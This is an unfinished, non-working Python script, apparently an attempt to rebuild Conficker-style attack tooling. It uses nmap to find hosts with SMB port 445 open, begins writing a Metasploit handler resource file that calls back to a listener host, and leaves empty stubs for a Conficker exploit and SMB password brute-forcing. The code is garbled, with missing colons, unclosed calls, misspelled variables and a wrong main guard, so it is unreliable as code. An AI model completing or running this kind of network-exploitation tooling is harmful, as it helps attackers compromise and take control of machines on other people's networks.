#this script is all of the conficker

import os
import optparse
import sys
import nmap

def findtarget(subnet):
	nmapscan = nmap.PortScanner()
	nmapscan.scan(subnet,'445')
	targethosts=[]
	for host in nmapscan.all_hosts():
		if nmap[host].has_tcp(445):
			state = nmapscan[host]['tcp'][445]['state']
			if state == 'open':
				print ('[+] Found Target Host:'+host)
				targethosts.append(host)
	return targethosts




def setuphandler(configfile,lhost,lport)
	configfile.write('use exploit/multi/handler\n')
	cnofigfile.write('set payload '+
	



def confickerexploit()




def smbbrute()




def main()
	configfile = open('meta.rc','w')
	parser = optparse.OptionParser('[-] Usage%prog '+'-h <RHOST[s]> -l <LHOST> -p <LPORT> -f<password file>')
	parser.add_option('-h',dest='targethost',type='string',help='specify the target host')
	parser.add_option('-l',dest='lhost',type='string',help='local host')
	parser.add_option('-p',dest='lport',type='string',help='local port')
	parser.add_option('-f',dest='passwordfile',type='string',help='password file')
	       

	targethosts=findtarget(targethost)
	setuphandler(configfile,lhost,lport)
	confickerexploit(
	smbbrute()
	

	



if _name_ == '_main_':
	main()

